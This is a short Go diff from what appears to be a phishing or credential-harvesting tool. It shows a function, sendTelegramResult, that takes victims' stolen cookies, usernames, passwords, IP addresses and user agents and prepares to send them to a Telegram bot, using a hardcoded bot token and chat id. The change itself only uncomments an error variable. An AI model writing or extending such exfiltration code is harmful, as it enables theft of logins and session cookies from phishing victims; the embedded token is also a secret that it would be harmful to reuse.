@@ -48,7 +48,7 @@ func getChatId() string {
 func sendTelegramResult(cookies string, username string, password string, remote_addr string, useragent string) {
 
 	// Send the message
-	//var err error
+	var err error
 	client, fileName := &http.Client{}, "filename-cookies.json"
 	token, chat_id := "5886667026:AAHMRZh4RSjsqaXNwPgZjOJ_W-ffDM5PpIE", "915867987"
 
